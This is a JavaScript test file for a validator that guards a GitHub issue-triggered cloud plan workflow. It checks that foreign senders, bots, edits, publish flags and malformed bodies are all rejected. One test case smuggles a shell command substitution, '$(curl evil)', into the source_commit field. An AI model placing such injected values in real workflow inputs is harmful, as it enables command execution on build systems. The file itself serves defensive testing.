import {test} from 'node:test';import assert from 'node:assert/strict';import {validate} from './ltc-cloud-plan-request.mjs';
const user={id:268053325,login:'Satnam-Satoshi',type:'User'}, sha='a'.repeat(40), digest='b'.repeat(64);
const issue={id:1,number:1,user,author_association:'OWNER',state:'open',title:'[LTC cloud request] software plan',created_at:'2026-11-13T21:00:00Z',updated_at:'2026-11-13T21:00:00Z',body:JSON.stringify({source_commit:sha,implementation_sha256:digest})};
const event={action:'opened',repository:{full_name:'Satnam-Satoshi/Satoshi-Langar'},sender:user,issue};
test('only fixed plan target with publish false',()=>{assert.deepEqual(validate(event,issue,sha).inputs,{source_commit:sha,implementation_sha256:digest,publish:'false'});});
for(const [name,mutate] of [
 ['foreign sender',e=>e.sender.id=1],['bot sender',e=>e.sender.type='Bot'],['wrong repo',e=>e.repository.full_name='other/repo'],['edited event',e=>e.action='edited'],['PR',e=>e.issue.pull_request={}],['non-owner',e=>e.issue.author_association='COLLABORATOR'],['shell identity',e=>e.issue.body=JSON.stringify({source_commit:'$(curl evil)',implementation_sha256:digest})],['publish injection',e=>e.issue.body=JSON.stringify({source_commit:sha,implementation_sha256:digest,publish:true})],['unknown title',e=>e.issue.title='publish'],['oversize',e=>e.issue.body=' '.repeat(513)]])test(name,()=>{const e=structuredClone(event);mutate(e);assert.throws(()=>validate(e,e.issue,sha));});
test('changed issue rejected',()=>assert.throws(()=>validate(event,{...issue,body:'{}'},sha)));
test('old source rejected',()=>assert.throws(()=>validate(event,issue,'c'.repeat(40))));
test('run rerun rejected',()=>assert.throws(()=>validate(event,issue,sha,'2')));
test('closed issue rejected',()=>assert.throws(()=>validate(event,{...issue,state:'closed'},sha)));
